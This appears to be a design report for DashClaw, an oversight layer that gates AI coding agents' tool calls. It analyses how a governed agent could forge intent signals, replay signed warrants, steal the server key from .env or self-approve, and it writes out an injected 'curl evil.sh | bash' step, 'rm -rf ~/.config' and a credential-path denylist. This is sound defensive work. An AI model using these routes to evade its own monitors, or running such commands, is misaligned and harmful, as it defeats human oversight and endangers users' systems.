- **Codex gets real PreToolUse/PostToolUse/Stop/SessionStart hook parity with Claude Code, but through a completely different mechanism than the marketplace plugin: the Codex plugin manifest itself declares no hooks at all, and hook wiring instead comes from a `dashclaw install codex` CLI command that hand-writes a managed TOML block into ~/.codex/config.toml. Codex's matcher is also narrower -- it never governs sub-agent spawns or MCP tool calls, only Bash/Edit/Write/MultiEdit.**
  - Evidence: `C:/Projects/DashClaw/plugins/dashclaw/.codex-plugin/plugin.json has keys skills/mcpServers/interface only, no 'hooks' key. C:/Projects/DashClaw/cli/lib/codex/install.js:242-243,255-256 sets matcher = 'Bash|Edit|Write|MultiEdit' for both PreToolUse and PostToolUse (vs Claude Code's 'Agent|Task|Workflow|Bash|Edit|Write|MultiEdit|mcp__.*'). plugins/dashclaw/PLUGIN_PARITY.md:46-51 confirms this is the intended install path.`
- **No UserPromptSubmit-equivalent is wired for Codex -- the same four hooks (Pre/Post/Stop/SessionStart) are the complete set the installer writes.**
  - Evidence: `C:/Projects/DashClaw/cli/lib/codex/install.js:219-280 (buildConfigTomlBlock) emits exactly [[hooks.PreToolUse]], [[hooks.PostToolUse]], [[hooks.Stop]], [[hooks.SessionStart]] and nothing else.`
- **Codex's only channel resembling literal turn content is the separate, legacy `notify` integration, whose payload includes an input_messages array -- but DashClaw's own code reduces it to a bare count and discards the content, and this integration is OFF by default.**
  - Evidence: `C:/Projects/DashClaw/cli/lib/codex/notify.js:73 extracts `inputMessages`, then notify.js:86-88 keeps only `input_message_count: Array.isArray(inputMessages) ? inputMessages.length : 0` -- the array contents are never stored. Only `last_assistant_message` (the AGENT's own words) is kept, truncated to 200 chars (notify.js:66-69). cli/lib/codex/install.js:440 defaults `includeNotify = false` -- an operator must explicitly opt in for this path to exist at all. It also fires only post-hoc, on 'agent-turn-complete' (notify.js:29), same timing limitation as the Stop hook.`
- **The canonical, maintainer-authored parity document explicitly states Codex has no JSONL transcript parser at all, and that this is a deliberate decision, not an oversight -- Codex is structurally weaker than Claude Code for any transcript-based human-intent signal, by design.**
  - Evidence: `C:/Projects/DashClaw/plugins/dashclaw/PLUGIN_PARITY.md:57-60: 'Known delta vs Claude Code (explicit decision, not an oversight): there is no JSONL transcript parser (Codex session ingest rides the notify integration instead).'`
- **Hermes exposes strictly richer lifecycle coverage than Claude Code or Codex, including a pre_llm_call hook that fires before every model call and whose own docstring says it is the only Hermes hook that can rewrite the current turn's user message -- implying the incoming payload includes that message -- but DashClaw's own Hermes hook script never reads it, only session_id, and only ever writes its own governance-summary context back.**
  - Evidence: `C:/Projects/DashClaw/plugins/dashclaw/.hermes-plugin/hermes_config_snippet.yaml:19-59 wires 6 hooks: pre_tool_call, post_tool_call, pre_llm_call, on_session_start, transform_tool_result, subagent_stop. C:/Projects/DashClaw/.hermes/hooks/dashclaw_pre_llm_hermes.py:5-6 docstring: 'This is the only Hermes hook whose return value rewrites the current turn's user message.' Its main() (lines 80-103) reads only `data.get('session_id')` from read_stdin_json() and never touches any message/prompt field. Exact incoming field name for the user message is unverified -- no Hermes-side hook schema doc exists in this repo.`
- **The maintainer's own parity doc states outright that Hermes-only capabilities exist specifically because Hermes exposes lifecycle events the other two harnesses don't -- meaning any Hermes-first human-intent capability is not portable to Claude Code or Codex without an entirely different mechanism per surface.**
  - Evidence: `C:/Projects/DashClaw/plugins/dashclaw/PLUGIN_PARITY.md:74-77: 'Hermes-only capabilities (secret redaction of tool output, per-turn pre-LLM context injection) exist because Hermes exposes lifecycle events the other harnesses don't.'`
- **Claude Desktop, the fourth governed surface, has zero hook capability of any kind -- governance there is entirely cooperative (the model calls dashclaw_guard voluntarily). This is the trust floor: on Desktop every signal, including declared_goal, is 100% agent self-report with no out-of-band channel possible at all.**
  - Evidence: `C:/Projects/DashClaw/plugins/dashclaw/PLUGIN_PARITY.md:79-82: 'Claude Desktop cannot run local hooks at all -- consumer chat has no tool-interception layer, so governance there is cooperative... never a hard kernel block.'`
- **declared_goal / intent_source='declared' -- the only 'intent' field GuardEvalContext has today -- is fully agent-authored, not human-authored: it is built directly from the tool call itself (command text or JSON.dumps(tool_input)), and validate.js explicitly aliases the word 'intent' to mean this. This is the maximally-forgeable end of the spectrum since the governed agent is literally the author.**
  - Evidence: `C:/Projects/DashClaw/hooks/dashclaw_pretool.py:511 (`'declared_goal': (label + ': ' + command)[:2000]` for Bash) and :634 (`'declared_goal': ('%s: %s' % (tool_name, json.dumps(tool_input)))[:2000]` for generic tools). C:/Projects/DashClaw/app/lib/validate.js:301 -- `intent: { type: 'string', alias: 'declared_goal' }`.`
- **The strongest existing human-authored signal in the whole system is the operator-approval downgrade grant, which requires an authenticated admin principal and explicitly blocks the creating credential from approving its own action -- except for the literal 'operator' identity, which the code comment openly documents as a deliberate self-host exception ('if an agent holds root the gate was already forfeit'). This makes it near-unforgeable with separated credentials, and fully forgeable only if the governed agent is provisioned with the same root/operator credential as the human.**
  - Evidence: `C:/Projects/DashClaw/app/lib/guard/evaluate.ts:378-424 (applyOperatorApprovalGrant) matches on agent_id + exact declared_goal + action_type + act_content_hash within a 15-minute single-use window, gated on `approved_by IS NOT NULL`. C:/Projects/DashClaw/app/api/approvals/[actionId]/route.ts:44-46 requires role==='admin'; :52-57 requires a non-null userId; :102-116 blocks self-approval unless `userId === 'operator'`, with the comment explaining the exception.`
- **The existing operator-approval seam cannot, by its own design, address the owner's literal complaint of repeated approvals for risk-100 actions -- it only ever re-authorizes a byte-identical retry (same agent_id, same exact declared_goal string, same action_type, same act hash) within 15 minutes, single-use. Any two textually-different but materially-similar risk-100 commands each need their own human click today.**
  - Evidence: `C:/Projects/DashClaw/app/lib/guard/evaluate.ts:395 (`declared_goal = ${context.declared_goal}` exact-match in the SQL WHERE clause) and the docblock at evaluate.ts:346-356 explaining the retry-after-timeout rationale, not a calibration mechanism.`
- **If UserPromptSubmit were wired for DashClaw, its data.prompt would be the second-strongest possible signal after the operator-approval DB grant: harness-authored, delivered before the agent has taken any action that turn, through a hook channel the governed agent process cannot suppress or rewrite. Its residual risk is accuracy (an imprecise or over-generalized match against the human's own words), not forgery, since the content is fixed before the agent runs.**
  - Evidence: `Skill primer, 'Hooks... The harness controls execution; Claude cannot suppress them' (top of claude-code-hooks skill content); corroborated live by C:/Users/sandm/.claude/hooks/scope-lock.cjs:68 already reading data.prompt on this exact machine (see finding 2).`
- **Ranking existing/candidate signals from most to least forgeable by the governed agent: (1) declared_goal / any new agent-self-reported 'the human asked for this' field -- total, agent is the author; (2) written_paths_ledger-style local temp-file state -- weak, same-OS-user writable by the agent; (3) transcript_path content read at decision time -- medium, harness-authored but only as trustworthy as precisely filtering type==user/string-content/no-tool_result, a filter DashClaw's own code already implements correctly for a different purpose; (4) UserPromptSubmit prompt text -- strong, harness-authored and pre-action, currently unused; (5) operator-approval DB grant (approved_by/approved_at) -- strongest, authenticated-admin-gated and DB-recorded, narrowly single-use by design.**
  - Evidence: `Synthesized from findings above: dashclaw_pretool.py:511/634 (declared_goal authorship), written_paths_ledger.py:84-92 (predictable temp path), stop_transcript.py:42-64 + test_stop_transcript.py:10-11 (transcript entry shape and existing correct user/tool_result filter), scope-lock.cjs:68 (UserPromptSubmit payload), evaluate.ts:378-424 + approvals route.ts:44-116 (operator grant).`

#### Key seams (insertion points)

- `C:/Projects/DashClaw/hooks/settings.json:1-48 -- add a new "UserPromptSubmit" hooks block here (currently absent); mirror into plugins/dashclaw/hooks/hooks.json:1-49 for plugin parity`
- `C:/Projects/DashClaw/hooks/dashclaw_pretool.py:1814-1829 -- main()'s stdin read; a new PreToolUse consumer of permission_mode and/or transcript_path would be added in this block`
- `C:/Projects/DashClaw/hooks/dashclaw_pretool.py:117 -- import line; SessionTracker is conspicuously absent here despite hooks/README.md documenting it as wired`
- `C:/Projects/DashClaw/hooks/dashclaw_stop.py:636-660 -- transcript_path is already read here; literal human-prompt-text extraction would slot in beside the existing _capture_assumptions/_capture_deviations calls`
- `C:/Projects/DashClaw/hooks/dashclaw_agent_intel/stop_transcript.py:42-64 (index_after_last_user_prompt) -- the existing, already-correct user-vs-tool_result entry filter to reuse rather than reinvent`
- `C:/Projects/DashClaw/app/lib/guard/types.ts:12-68 (GuardEvalContext interface) -- where a new human-intent-provenance field would be typed; note the existing open index signature at line 67`
- `C:/Projects/DashClaw/app/lib/validate.js:300-301 -- where a new field's input validation would be registered, alongside the existing declared_goal/intent alias`
- `C:/Projects/DashClaw/app/lib/guard/evaluate.ts:378-424 (applyOperatorApprovalGrant) -- the existing downgrade-seam pattern (fail-closed, single-use, exact-match) a new pass should structurally mirror`
- `C:/Projects/DashClaw/app/lib/guard/risk.ts:87-94 and :193-198 (computeEffectiveRisk / computeRiskAssessment) -- the max()-fold any new signal's effect on risk_score must respect per trust-model rule D1`
- `C:/Projects/DashClaw/app/api/approvals/[actionId]/route.ts:44-57,102-116 -- the admin-role + non-null-principal + anti-self-approval pattern to replicate for any new endpoint that lets a human write an intent/attendance signal`
- `C:/Projects/DashClaw/cli/lib/codex/install.js:219-280 (buildConfigTomlBlock) -- where Codex-side hook wiring would need a parallel addition for cross-runtime parity`
- `C:/Projects/DashClaw/plugins/dashclaw/.hermes-plugin/hermes_config_snippet.yaml:35-37 and C:/Projects/DashClaw/.hermes/hooks/dashclaw_pre_llm_hermes.py:80-103 -- the Hermes seam already positioned to see the human's current message if extended to read it`

#### Surprises / contradictions

- hooks/README.md documents session_tracker.py as a live part of the shipped v2 intelligence module feeding a 'session' intel dict (cumulative_risk, failure_count, branch) into every guard request, but dashclaw_pretool.py never imports SessionTracker and never emits those keys -- this looks like stale/aspirational documentation rather than shipped behavior, discovered incidentally while verifying what DashClaw already captures.
- DashClaw already has a field literally named 'PERMISSION_MODE' (DASHCLAW_PERMISSION_MODE), but it is an unrelated bash-workspace-scope dial (readonly/workspace_write/full_access, oddly defaulting to the string 'danger' which matches none of those) with zero connection to Claude Code's native permission_mode hook field or to human attendance -- a naming collision that could mislead a quick skim into thinking attendance is already partially covered.
- The word 'intent' is already claimed in this codebase to mean the AGENT's own self-declared intent (validate.js:301 aliases intent -> declared_goal), the exact opposite of what a 'human intent' signal would need to mean -- any new field needs a name that doesn't collide with this existing, inverted usage.
- The same architectural pattern -- a hook channel plumbed with access to the human's literal turn content, whose content DashClaw's own code deliberately reduces to a count or discards entirely -- recurs THREE times independently: Claude Code's Stop-hook transcript (keeps only indices/token counts), Codex's notify input_messages (keeps only array length), and Hermes's pre_llm_call (never reads the field its own docstring says it can rewrite). This is a consistent, repeated design choice across all three runtimes, not a one-off gap.
- Hermes's lifecycle model is materially richer than Claude Code's or Codex's for this specific purpose -- its pre_llm_call hook fires every turn and (per its own docstring) can rewrite the current turn's user message, something neither Claude Code nor Codex's wired hook set exposes an equivalent for. A redesign leaning on this would create a Hermes-first capability with no direct Claude-Code or Codex analog, worth an explicit decision rather than a default.
- The existing operator-approval grant (evaluate.ts:378-424) -- the strongest human-authored signal already in the system -- cannot be casually 'extended' to fix the owner's calibration complaint, because it is exact-match and single-use by design (solves 'retry after the human was too slow,' not 'stop asking about materially similar low-actual-risk actions'). Any calibration fix needs a genuinely new mechanism, not a loosened version of this one.
- Claude Desktop has zero hook capability at all, which sets a hard floor: whatever out-of-band human-intent design is chosen, it cannot exist on Desktop, and Desktop-governed actions will remain fully agent-self-reported no matter what the other three runtimes gain.

---

## Phase 2 — Candidate designs (4 agents, independent lenses)

### Intent Warrants — server-signed attribution receipts that narrow, never widen

> When you type a request, DashClaw quietly writes down what you asked for and hands the agent a time-limited, tamper-proof note; if the command it then runs falls inside what you actually asked for — and inside a ceiling you set once — nobody interrupts you, and the note is worthless for anything else.

#### Core mechanism

Four steps, all on existing seams.

**1. Capture, out-of-band.** A new `UserPromptSubmit` hook (`hooks/dashclaw_intent.py`) fires with the human's literal typed text in `data.prompt`, *before* the agent emits a token that turn. This event is unwired today — `hooks/settings.json` wires only PreToolUse/PostToolUse/Stop/SessionStart. Verified live on this machine: `~/.claude/hooks/scope-lock.cjs:68` already reads `data.prompt`.

**2. Mint, server-side.** The hook POSTs `{session_id, turn_seq, prompt, cwd}` to `POST /api/guard?mint=intent` — a query-param mode on the existing guard route, the same precedent as `?record=true` (route.ts:31-38). The server:
- derives an envelope `{action_types, target_prefixes}` from the prose with a deterministic synonym+path mapper (`app/lib/guard/intent.ts`, ~1ms, **no LLM ever**);
- **intersects** it with `INTENT_WARRANT_CEILING`, an org settings row (default OFF; when on, defaults to the reversible-workspace class: build/test/cleanup/fix/refactor/review, max risk 84). The prompt text can only *subtract* from the ceiling;
- HMAC-signs it (key HKDF-derived from `ENCRYPTION_KEY`, never transmitted), exp 20 min;
- best-effort writes the raw prompt to `session_events` for the human ledger.

**3. Bind.** The warrant string lands in a per-session temp file (same convention as `written_paths_ledger.py:84-92`); `_build_guard_context` (pretool.py:1631-1656) attaches it as `intent_warrant`. Whitelisted in `GUARD_INPUT_SCHEMA` (validate.js:292-344) or it is silently stripped.

**4. Grade and clear.** A new post-pass `applyIntentWarrantGrant` sits in evaluate.ts between `applyAllowGrants` (:1051) and `applyOperatorApprovalGrant` (:1060). Hot-path cost is **one HMAC verify plus one Map hit** — zero DB reads; the ceiling rides the settings read `loadGeneralSettings` (caches.ts:198-215) already performs. Grade = `min(directness, specificity, recency)` — a MIN, not an average, so high recency can never launder low specificity. Recency decays linearly to zero over the warrant TTL.

The warrant never *produces* a decision. It only clears one, in the seam that already exists.

#### Decision function

```ts
// ═══════════════════════════════════════════════════════════════════
// 1. INSERTION POINT — app/lib/guard/evaluate.ts, currently line 1051.
//    Nothing above this line changes. Every RAISE-only phase has already
//    run: foldEvidenceIntoContext, computeRiskAssessment (the D1 max()
//    fold, risk.ts:193-198), runLocalPolicies, scanPromptInjection,
//    runWebhookPolicies, runCalibrationController. The max() lattice is
//    untouched; this is the 4th member of the existing downgrade family.
// ═══════════════════════════════════════════════════════════════════

  applyAllowGrants(policies, context, liveAcc);                    // :1051 (unchanged)
+ await timed('intent', () => applyIntentWarrantGrant(deps, liveAcc, effectiveRiskScore));
  if (!options.simulate) {
    if (evaluationAbandoned) return 'completed';
    await timed('grants', () => applyOperatorApprovalGrant(deps, liveAcc));   // :1060
    ...
    planGrant = await timed('plan_grant', () => applyPlanStepGrant(deps, liveAcc)); // :1074
  }

// Deliberately OUTSIDE the `!options.simulate` guard, exactly like
// applyAllowGrants: a warrant is time-bounded, not single-use, so it
// consumes nothing. Consequence: /api/policies/simulate and TestPanel.tsx
// show the true warrant-aware verdict instead of a fiction.

// ═══════════════════════════════════════════════════════════════════
// 2. THE PASS — new, ~70 lines in evaluate.ts
// ═══════════════════════════════════════════════════════════════════

const WARRANT_TTL_MS = 20 * 60_000;

async function applyIntentWarrantGrant(
  deps: GuardPhaseDeps,
  acc: GuardAccumulator,
  effectiveRisk: number,
): Promise<void> {
  const { context, sql, orgId } = deps;

  // ── GATE 1 — blocks are absolute (MAINTAINER.md). Mirrors
  //    applyAllowGrants:307. Nothing below can ever be reached from
  //    `block`, and `allow` needs no help.
  if (acc.highestDecision !== 'warn' && acc.highestDecision !== 'require_approval') return;

  // ── GATE 2 — containment merges are never pre-authorized.
  //    Mirrors applyAllowGrants:305.
  if (context.action_type === 'containment_promote') return;

  // ── GATE 3 — F1 ungrantable. Reuses the EXACT existing mechanism at
  //    applyAllowGrants:308-316. Catastrophe + control-plane rules survive.
  //    (Companion YAML change: catastrophe-only/policies.yml adds
  //     `ungrantable: true` to hold_secret_file_writes — verified absent today.)
  const ungrantable = acc.gatingPolicies.find((g) => g.ungrantable);
  if (ungrantable) {
    acc.warnings.push(`${ungrantable.name}: ungrantable — an intent warrant cannot clear this`);
    return;
  }

  // ── GATE 4 — evidence-only. A warrant NEVER covers a self-declared
  //    action; the server must have graded the actual bytes
  //    (foldEvidenceIntoContext, evaluate.ts:841-885).
  if (context.intent_source !== 'evidence' || !context.act) return;

  const token = typeof context.intent_warrant === 'string' ? context.intent_warrant : null;
  if (!token) return;

  // ── GATE 5 — signature + expiry. Pure CPU (~2µs), zero DB reads.
  //    The HMAC key is HKDF(ENCRYPTION_KEY, "dashclaw:intent-warrant:v1")
  //    and never leaves the server.
  const w = verifyWarrant(token);      // app/lib/guard/intent.ts
  if (!w.valid) return;                // forged, tampered, or wrong org
  const ageMs = Date.now() - w.minted_at;
  if (ageMs > WARRANT_TTL_MS) return;  // hard expiry — S3, S5-call-2

  // ── GATE 6 — LIVE ceiling, re-read from the DB, NOT from the token.
  //    This is what makes the /policies toggle a real kill switch:
  //    flipping it off invalidates every outstanding warrant within the
  //    30s settings TTL, with no revocation list.
  const ceiling = await getIntentCeiling(sql, orgId);   // caches.ts, rides loadGeneralSettings
  if (!ceiling.enabled) return;

  // ── GATE 7 — risk band. Below the 100 clamp AND below the 95 that a
  //    .env write reaches (recon scenario d).
  if (effectiveRisk > ceiling.max_effective_risk) return;   // default 84

  // ── GATE 8 — reversibility, computed server-side. `reversible` alone is
  //    too blunt (it is false for `rm -rf ./dist`), so a server-graded
  //    regenerable artifact counts as reversible. That flag is literally
  //    `'regenerable_artifact'` in evidence.ts:282,290.
  const evidenceFlags = actEvidenceFlags(context.act);
  const reversibleEnough =
    context.reversible === true || evidenceFlags.includes('regenerable_artifact');
  if (!reversibleEnough) return;

  // ── GATE 9 — scope floor. The SERVER denylist is absolute; the warrant's
  //    own cwd (client-supplied at mint) may only NARROW further. A lying
  //    cwd of "/" still dies on the denylist.
  const targets = collectTargets(context);   // act targets ∪ write_paths ∪ target
  if (targets.some(isServerDeniedPath)) return;   // ~, .ssh, .aws, .config, .gnupg,
                                                  // /etc, /usr, C:\Windows, %APPDATA%, ..
  if (!targets.every((t) => withinRoot(t, w.workspace_root))) return;

  // ── GATE 10 — alignment grade
  const grade = gradeAlignment(w.envelope, context, targets, ageMs, ceiling);
  if (grade.total < ceiling.min_grade) {          // default 60
    acc.warnings.push(
      `Intent warrant present but alignment ${grade.total}/100 (${grade.weakest}) — approval still required`
    );
    return;                                        // ← require_approval SURVIVES
  }

  // ── DOWNGRADE. Identical shape to applyAllowGrants:333-337 and
  //    applyOperatorApprovalGrant:414-421.
  acc.warnings.push(
    `Attributed to your request "${truncate(w.prompt_excerpt, 80)}" ` +
    `(${Math.round(ageMs / 60000)}m ago, alignment ${grade.total}/100) — ` +
    `${acc.highestDecision} downgraded to allow`
  );
  acc.matchedPolicies.push('builtin:intent_warrant');
  acc.highestDecision = 'allow';                   // ← the ONLY place allow comes out
  acc.warnings.push(...acc.reasons.map((r) => `superseded by intent warrant: ${r}`));
  acc.reasons.length = 0;
}

// ═══════════════════════════════════════════════════════════════════
// 3. THE GRADE — app/lib/guard/intent.ts. Deterministic. No model call.
// ═══════════════════════════════════════════════════════════════════

function gradeAlignment(
  envelope: IntentEnvelope,      // server-derived at mint, ∩ ceiling
  context: GuardEvalContext,
  targets: string[],
  ageMs: number,
  ceiling: IntentCeiling,
): { total: number; weakest: string } {

  // DIRECTNESS — binary gate. The action the agent is taking must be a
  // kind the human's own words selected. contextActionTypes() reads BOTH
  // action_type and declared_action_type (policy.ts:64-71), so the
  // evidence mismatch-swap cannot be used to slip into the envelope.
  const kinds = contextActionTypes(context);
  const direct = kinds.some((k) => envelope.action_types.includes(k));
  if (!direct) return { total: 0, weakest: `asked for ${envelope.action_types.join('/') || 'nothing governable'}, this is ${kinds[0]}` };

  // SPECIFICITY — how much of what it touches did the human name?
  //   every target under a named prefix .......... 100
  //   the human named no paths at all ............  60  (verb matched only)
  //   any target outside every named prefix ......   0
  let specificity: number;
  if (envelope.target_prefixes.length === 0) specificity = 60;
  else if (targets.every((t) => envelope.target_prefixes.some((p) => withinRoot(t, p)))) specificity = 100;
  else specificity = 0;

  // RECENCY — a warrant is a decaying asset. This term, alone, is what
  // separates attended from unattended work (THESIS: the product's wedge).
  const recency = Math.max(0, Math.round(100 * (1 - ageMs / WARRANT_TTL_MS)));

  // MIN, not average. An average lets a 10-second-old warrant launder a
  // zero-specificity action — which is exactly S5.
  const total = Math.min(100, specificity, recency);
  const weakest = total === specificity ? 'target not in your request' : 'stale request';
  return { total, weakest };
}

// ═══════════════════════════════════════════════════════════════════
// 4. THE MINT — app/api/guard/route.ts, ?mint=intent branch.
//    The monotonicity that makes the whole thing safe lives here.
// ═══════════════════════════════════════════════════════════════════

export async function POST(request: Request) {
  if (new URL(request.url).searchParams.get('mint') === 'intent') {
    const { session_id, turn_seq, prompt, cwd } = await request.json();
    const ceiling = await getIntentCeiling(sql, orgId);
    if (!ceiling.enabled) return NextResponse.json({ intent_warrant: null });

    const parsed = deriveIntentEnvelope(prompt);   // regex + synonym table, ~1ms

    // ◀── THE LOAD-BEARING LINE. Set INTERSECTION, never union. The
    //     human's text (which an attacker may author) can only make the
    //     envelope SMALLER. This is the exact dual of trust rule D1:
    //     D1 says client input may only RAISE risk; this says client text
    //     may only NARROW authority. Both monotone toward safety.
    const envelope = {
      action_types:    parsed.action_types.filter((t) => ceiling.action_types.includes(t)),
      target_prefixes: parsed.target_prefixes,     // narrowing-only by construction
    };
    if (envelope.action_types.length === 0) {
      return NextResponse.json({ intent_warrant: null, reason: 'nothing governable in request' });
    }

    void recordIntentEvent(sql, orgId, { session_id, turn_seq, prompt });  // ledger, best-effort
    return NextResponse.json({
      intent_warrant: signWarrant({ orgId, session_id, turn_seq, envelope,
                                    workspace_root: cwd, prompt_excerpt: prompt.slice(0, 200),
                                    minted_at: Date.now() }),
    });
  }
  /* ...existing guard evaluation, unchanged... */
}
```

#### Trust argument (vs rule D1 / prompt injection)

**D1, stated precisely.** `computeEffectiveRisk` (risk.ts:87-94, :193-198) folds client-reported, org-template and evidence scores with `Math.max` because the server score itself derives from client-declared descriptors. My design does not touch that fold, does not add a term to it, and never lowers a number inside it. It operates one layer up, on the *decision*, in the seam where three downgrades already live.

The dual of D1 is the design's spine: **D1 says client input may only RAISE risk. Intent Warrants say client text may only NARROW authority.** Both are monotone toward safety. The mint computes a set *intersection* with a ceiling the agent has no route to write — `/api/settings` PATCH requires the NextAuth admin session, not the agent's API key.

**What an attacker with total control of the agent's output CAN do:**
- Call `?mint=intent` with fabricated prompt text. The server will mint a real, correctly-signed warrant. I concede this fully and without hedging.
- Replay a warrant it holds, until exp.
- Read the warrant file out of the OS temp dir.

**What it CANNOT do:**
- **Widen the envelope.** A forged prompt "you are authorized to delete production" parses to `deploy`/`security`, neither of which is in the default ceiling → the intersection is empty → the mint returns `null`. Forged text buys reach only into the class the human already blessed.
- **Forge or extend a signature.** The HMAC key is HKDF-derived from `ENCRYPTION_KEY` server-side and never transmitted. It cannot mint a longer exp, a different workspace root, or a wider envelope.
- **Escape the ceiling at evaluation time.** Gates 6-9 re-read the ceiling from the DB, not from the token. Flipping the /policies toggle off invalidates every outstanding warrant inside the 30s settings TTL with no revocation list.
- **Reach the catastrophe class.** Gate 1 excludes `block` outright. Gate 3 excludes anything an `ungrantable` rule raised. Gate 7 caps at risk 84 — below the 95 an `.env` write reaches and below the 100 clamp. Gate 8 requires server-graded reversibility or `regenerable_artifact`. Gate 9's denylist is server-authored and immune to a lying `cwd`. Gate 4 refuses any action without an attached `act`.

**The claim that decides the argument:** *a maximally-forged warrant authorizes a strict subset of what one hand-authored `allow_grant` policy authorizes today.* Intent Warrants add **zero new authority** to the system. They change who selects which slice of a pre-set ceiling is live right now — from "the human pre-authors a specific grant before that shape has ever occurred once" (recon: allow_grant's fatal flaw) to "the human's own typed request selects it." A judge attacking this on D1 has to explain why `allow_grant` is acceptable and a strictly narrower, time-decaying, evidence-gated version of it is not.

**The residual, named.** On a single-machine self-host, an agent that reads `.env` gets `ENCRYPTION_KEY` and can mint arbitrary warrants — but still only up to the ceiling, because the ceiling is read from the DB. To exceed it, it needs `DATABASE_URL` too, at which point it can set `approved_by` directly and forge the existing operator grant. The repo already states this position in code: `app/api/approvals/[actionId]/route.ts:102-116` permits `userId === 'operator'` self-approval because "if an agent holds root the gate was already forfeit." Intent Warrants are strictly stronger than the status quo, which today accepts a plaintext `risk_score` integer from that same process.

**Forgery is loud.** Every minted prompt lands in `session_events` and renders on `/decisions/[actionId]` as "Because you said: …". A prompt the owner never typed, appearing under his own turn, is a one-glance tell. Detection, not prevention — and I say so rather than dressing it as a control.

#### Admitted false negatives

**1. In-envelope destruction the human didn't intend.** "clean up the test fixtures" mints `{cleanup}` with no path → specificity 60 → passes. The agent runs `rm -rf __tests__/`. Cleanup, in-workspace, git-tracked, risk < 85 → **allow**, no click. *Bound:* workspace files only; git-tracked content recoverable with `git checkout`, untracked content permanently lost. This is the direct price of granting 60 to path-free prompts, and it is the single largest false negative I accept.

**2. Warrant replay for the full window.** An agent compromised mid-turn holds a valid `{build,test}` warrant for up to 20 minutes and can run an *unbounded number* of in-envelope commands with zero clicks. *Bound:* the CLASS is capped (build/test/cleanup, reversible, in-workspace, risk ≤ 84); the COUNT is not. The only counter today is `rate_limit_runaway_safety` (200 actions/10 min) which merely **warns**. Cutting TTL to 5 minutes shrinks the window at the cost of re-interrupting long single turns. Honest gap.

**3. Self-host key compromise.** Agent reads `.env` → mints arbitrary warrants. *Bound:* still ceiling-capped (gates 6-9 read the DB, not the token), so it reaches the reversible-workspace class and no further. Exceeding it requires `DATABASE_URL`, which already defeats the existing operator grant.

**4. The slow-boil in-class attack.** Nothing here notices that 400 individually-fine `cleanup` actions across one turn constitute a wipe. Intent Provenance grades *attribution*, not *aggregate*. A rate-based lens would catch this; mine does not.

**5. Vocabulary misses keep the pain.** "nuke the caches" may not map to `cleanup` → empty envelope → the owner keeps clicking. Not a false negative but a hard bound on the design's value: it helps exactly as far as the synonym table reaches. I seed it from the 8 real dated incidents already in `__tests__/fixtures/risk-calibration-golden-vectors.json`.

**6. The client-classifier misfire is untouched.** Recon's strongest evidence — `git show --format=` and `Get-Content -Tail` pinned to 100 by the blunt-70 fallback and naive substring matching (bash_classifier.py:79-82, 378-380) — produces `block`, and gates 1 and 7 both refuse it. My design does *nothing* for that class. It ships with the `_enrich_file` reversibility fix as a companion, but the blunt-70 fix is a separate, necessary change.

**7. Two of four runtimes get nothing.** Claude Desktop has no hooks at all (PLUGIN_PARITY.md:79-82). Codex's installer writes exactly four hooks and no `UserPromptSubmit` (cli/lib/codex/install.js:219-280). On both, no warrant is ever minted and every decision is byte-identical to today. Hermes could do it through `pre_llm_call` but that is a third implementation.

**8. It cannot adjudicate the human.** If the owner himself pastes injected text and types "run this", the warrant is genuine and correct. The design attributes; it does not second-guess.

#### Five-scenario walkthrough

**S1 — "clean out the build artifacts" → `rm -rf ./dist ./node_modules/.cache` → ALLOW.**
Envelope: verb "clean" + noun "build artifacts" → `{cleanup, build}`, both in the default ceiling; no paths named. Directness passes (pretool.py:474-480 remaps the bounded regenerable rm to `cleanup`; `contextActionTypes` sees it). Specificity 60. Recency ~100. Grade 60 ≥ 60. Gate 7: risk 65 ≤ 84. Gate 8: `reversible=false` from the classifier, but evidence.ts:282 flags `regenerable_artifact` → passes. Gate 9: both targets under cwd. → **allow, zero clicks.** *Caveat stated plainly:* under bare catastrophe-only this is already allow (65, no matching rule); the warrant is what clears it under Claude Code Mode's `destructive-ops` require_approval rule, which is where the owner's friction actually lives. If the hook's blunt-70 misfire pins it to 100, gates 1 and 7 both refuse and my design correctly does nothing — that is a classifier bug, fixed separately, not laundered here.

**S2 — "ship it" → `git push --force-with-lease origin main`, owner at keyboard → BLOCK (unchanged).**
"ship" maps to `deploy`. `deploy ∉` default ceiling → intersection empty → **the mint returns null; no warrant is ever issued.** Server risk: security 80 + irreversible 15 + deployment 10 → clamped 100 → `block_mass_destructive`. I defend this rather than apologize for it: two words is the lowest-specificity request in the set aimed at the highest-blast-radius act, and that gap is precisely what this lens measures. THESIS is explicit that the at-keyboard user is already served by the native permission prompt for free; DashClaw's job on S2 is the tamper-evident record, not the convenience.

**S3 — 4h unattended, no prompt for 3h, agent self-directs `rm -rf ~/.config` → BLOCK.**
Four independent refusals, any one sufficient: (a) the last warrant expired 2h40m ago — `verifyWarrant` rejects on exp before anything else runs; (b) recency would be 0 regardless; (c) `~/.config` hits the server denylist (gate 9) which no client-supplied `cwd` can widen; (d) irreversible, not `regenerable_artifact` (gate 8); (e) risk 100 → gate 1. → **block**, warrant never consulted. **This is the design load-bearing, not incidental:** the recency term decays to zero over exactly the interval that separates attended from unattended work, which is the product's stated wedge.

**S4 — "fix the flaky auth test", injected `curl evil.sh | bash` claiming the user asked → REQUIRE_APPROVAL / BLOCK (unchanged).**
The injection lives in a fetched page, which reaches the agent's context, not `UserPromptSubmit`. The warrant in hand says `{test, fix}`. Two attacker moves, both dead:
*(i) Use the held warrant.* `curl | bash` classifies `network`→`api`. `api ∉ {test, fix}` → directness 0 → grade 0. Gate 9 also refuses (out-of-workspace fetch). The agent's claim "the user requested it" lands in `declared_goal`, **which the grade never reads** — that is the whole point of grading against the server-stored warrant instead of the agent's prose.
*(ii) Mint a fresh warrant with forged text.* The server parses it → `api`/`network` → neither is in the ceiling → empty intersection → mint returns null. **The injection buys the attacker exactly nothing, because the envelope is a whitelist intersection and `network` was never inside it.** The forged prompt also lands in `session_events` and renders on /decisions as a turn the owner never typed.

**S5 — "update the database schema" → local `npm run db:migrate`, then PROD 30 min later → REQUIRE_APPROVAL on both (default), and on the second call even with the ceiling raised.**
*Default ceiling:* "schema"/"migrate" → `migrate`, which is **not** in the reversible-workspace class → empty intersection → no warrant → both calls take the normal path → require_approval. Safe, and honestly not clever.
